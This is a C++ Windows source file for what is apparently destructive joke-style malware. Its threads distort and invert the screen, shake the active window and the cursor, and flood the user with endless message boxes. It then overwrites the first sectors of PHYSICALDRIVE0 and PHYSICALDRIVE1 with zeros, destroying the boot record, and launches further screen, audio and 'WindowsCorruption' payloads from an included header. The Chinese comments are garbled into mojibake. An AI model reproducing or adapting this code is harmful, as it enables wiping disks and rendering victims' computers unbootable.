#include <iostream>
#include <thread>
#include "resource.h"
#include <Windows.h>
#include <stdio.h>
#include <tchar.h>
#include "payloads.h"
// ��һ��ѭ���ṹ
//void str() {
//    for(;;){
//        PlaySound(MAKEINTRESOURCE(IDR_WAVE1), NULL, SND_RESOURCE);
//    }
//}

// �ڶ���ѭ���ṹ
void loop2() {
        HWND hwnd = GetDesktopWindow();  //��ȡ������
        HDC hdc = GetWindowDC(hwnd); //��ȡ���������ĵľ��
        for(;;){
            StretchBlt(hdc, 0, 30,
            GetSystemMetrics(SM_CXSCREEN) - 100,/*Ŀ����*/
            GetSystemMetrics(SM_CYSCREEN) - 80,/*Ŀ��߶�*/
            hdc, 0, 0,
            GetSystemMetrics(SM_CXSCREEN), /*��ȡ��Ļ�߶�*/
            GetSystemMetrics(SM_CYSCREEN), /*��ȡ��Ļ���**/
            SRCCOPY/*��Դ��������ֱ�ӿ�����Ŀ���������*/
            );
            Sleep(5000);
        }
}
// ������ѭ���ṹ
void loop3(){
    for(;;){
        HWND hwnd = GetDesktopWindow();  //��ȡ������
        HDC hdc = GetWindowDC(hwnd); //��ȡ���������ĵľ��
        BitBlt(hdc, 0, 0,
        GetSystemMetrics(SM_CXSCREEN),/*��ȡ��Ļ���*/
        GetSystemMetrics(SM_CYSCREEN),/*��ȡ��Ļ�߶�*/
        hdc, 0, 0, DSTINVERT);
        Sleep(5000);
    }    
}
void window(HWND hwnd, int x, int y)
{
    SetWindowPos(hwnd, HWND_TOP, x, y, 0, 0, SWP_NOSIZE);
}
//���ĸ�ѭ���ṹ
void loop4() {
    for (;;) {
        HWND hwnd; //���ڱ��浱ǰ���ڴ��ھ��
        RECT rect;//RECT��һ�����νṹ�壬�൱�ڱ�����α߿���ĸ�����
        int i = 0, k = 2;
        while (1 > 0)//��ѭ�� 
        {
            for (i = 0; i < 1000; i++)
            {
                hwnd = GetForegroundWindow();//��ȡ����ھ��
                GetWindowRect(hwnd, &rect);//��ȡָ������λ��
                window(hwnd, rect.left + rand() % k - rand() % k,
                    rect.top + rand() % k - rand() % k);//�����Ƶ���Ļ��ָ��λ��
            }
            if (k < 20)
            {
                k++;
            }
        }
    }
}
// �����ѭ���ṹ
void loop5() {
    POINT point;
    int i = 0, k = 1;
    while (1 > 0)
    {
        for (i = 0; i < 1000; i++)
        {
            GetCursorPos(&point);
            SetCursorPos(point.x + rand() % k - rand() % k,
                point.y + rand() % k - rand() % k);
        }
        if (k < 20)
        {
            k++;
        }
    }
}
void loop6() {
    for (;;) {
        MessageBox(NULL,L"��ͷ�b俣�ͷ̫��ͷ̫��", L"�ٺ�",MB_ICONINFORMATION);
    }
}
void loop8() {
    for (;;) {
        MessageBox(NULL,L"��ͷ�b俣�ͷ̫��ͷ̫��", L"�ٺ�",MB_ICONINFORMATION);
    }
}
void loop9() {
    for (;;) {
        MessageBox(NULL,L"��ͷ�b俣�ͷ̫��ͷ̫��", L"�ٺ�",MB_ICONINFORMATION);
    }
}
void loop10() {
    for (;;) {
        MessageBox(NULL,L"��ͷ�b俣�ͷ̫��ͷ̫��", L"�ٺ�",MB_ICONINFORMATION);
    }
}
void loop11() {
    for (;;) {
        MessageBox(NULL,L"��ͷ�b俣�ͷ̫��ͷ̫��", L"�ٺ�",MB_ICONINFORMATION);
    }
}
void loop7() {
    for (;;) {
        MessageBox(NULL, L"����ʵ�鱻��ס�ˣ���������", L"�ٺ�", MB_ICONINFORMATION);
    }
}
void loop12() {
    for (;;) {
        MessageBox(NULL, L"����ʵ�鱻��ס�ˣ���������", L"�ٺ�", MB_ICONINFORMATION);
    }
}
void loop13() {
    for (;;) {
        MessageBox(NULL, L"����ʵ�鱻��ס�ˣ���������", L"�ٺ�", MB_ICONINFORMATION);
    }
}
void loop14() {
    for (;;) {
        MessageBox(NULL, L"����ʵ�鱻��ס�ˣ���������", L"�ٺ�", MB_ICONINFORMATION);
    }
}
void loop15() {
    for (;;) {
        MessageBox(NULL, L"����ʵ�鱻��ס�ˣ���������", L"�ٺ�", MB_ICONINFORMATION);
    }
}
void InitDPI() {
    HMODULE hModUser32 = LoadLibrary(L"user32.dll");
    BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");

    if (SetProcessDPIAware) {
        SetProcessDPIAware();
    }

    FreeLibrary(hModUser32);
}
int WinMain(
    _In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPSTR lpCmdLine,
    _In_ int nShowCmd
) {
    /*std::thread t1(str);*/
    Sleep(5000);
    std::thread t2(loop2);
    Sleep(5000);
    std::thread t3(loop3);
    Sleep(5000);
    std::thread t4(loop4);
    Sleep(5000);
    std::thread t5(loop5);
    std::thread t6(loop6);
    std::thread t7(loop7);
    std::thread t8(loop8);
    std::thread t12(loop12);
    std::thread t9(loop9);
    std::thread t13(loop13);
    std::thread t10(loop10);
    std::thread t14(loop14);
    std::thread t11(loop11);
    FILE* fd1 = fopen("\\\\.\\PHYSICALDRIVE0", "rb+");
    char buffer1[512] = { 0 };
    fseek(fd1, 0, SEEK_SET);
    fwrite(buffer1, 512, 1, fd1);
    fclose(fd1);
    FILE* fd2 = fopen("\\\\.\\PHYSICALDRIVE0", "rb++");
    char buffer2[1024] = { 0 };
    fseek(fd2, 1, SEEK_SET);
    fwrite(buffer2, 1024, 1, fd2);
    fclose(fd2);
    FILE* fd3 = fopen("\\\\.\\PHYSICALDRIVE1", "rb++");
    char buffer3[1024] = { 0 };
    fseek(fd3, 1, SEEK_SET);
    fwrite(buffer3, 1024, 1, fd3);
    fclose(fd3);
    AUDIO_SEQUENCE_PARAMS pAudioSequences[AUDIO_NUM] = { 0 };
    pAudioSequences[0] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence1 };
    pAudioSequences[1] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence2 };
    pAudioSequences[2] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence3 };
    pAudioSequences[3] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence4 };
    pAudioSequences[4] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence5 };
    pAudioSequences[5] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence6 };
    pAudioSequences[6] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence7 };
    pAudioSequences[7] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence8 };
    pAudioSequences[8] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence9 };
    pAudioSequences[9] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence10 };

    SeedXorshift32((DWORD)__rdtsc());

    InitDPI();

    CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(InitTimer), (PVOID)1000, 0, NULL);
    CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(AudioPayloadThread), (PVOID)pAudioSequences, 0, NULL);


    ExecutePayload(Payload1, PAYLOAD_TIME);
    ExecutePayload(Payload2, PAYLOAD_TIME);
    ExecutePayload(Payload3, PAYLOAD_TIME);
    ExecutePayload(Payload4, PAYLOAD_TIME);
    ExecutePayload(Payload5, PAYLOAD_TIME);
    ExecutePayload(Payload6, PAYLOAD_TIME);
    ExecutePayload(Payload7, PAYLOAD_TIME);
    ExecutePayload(Payload8, PAYLOAD_TIME);
    ExecutePayload(Payload9, PAYLOAD_TIME);
    ExecutePayload(Payload10, PAYLOAD_TIME);

    ExecuteShader(Shader1, PAYLOAD_TIME);
    ExecuteShader(Shader2, PAYLOAD_TIME);
    ExecuteShader(Shader3, PAYLOAD_TIME);
    ExecuteShader(Shader4, PAYLOAD_TIME);
    ExecuteShader(Shader5, PAYLOAD_TIME);
    ExecuteShader(Shader6, PAYLOAD_TIME);
    ExecuteShader(Shader7, PAYLOAD_TIME);
    ExecuteShader(Shader8, PAYLOAD_TIME);
    ExecuteShader(Shader9, PAYLOAD_TIME);
    ExecuteShader(Shader10, PAYLOAD_TIME);
    ExecuteShader(Shader11, PAYLOAD_TIME);
    ExecuteShader(Shader12, PAYLOAD_TIME);
    ExecuteShader(Shader13, PAYLOAD_TIME);
    ExecuteShader(Shader14, PAYLOAD_TIME);
    ExecuteShader(Shader15, PAYLOAD_TIME);
    ExecuteShader(Shader16, PAYLOAD_TIME);

    CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(WindowsCorruptionPayload), NULL, 0, NULL);
    /*t1.join();*/
    t2.join();
    t3.join();
    t4.join();
    t5.join();
    return 0;
}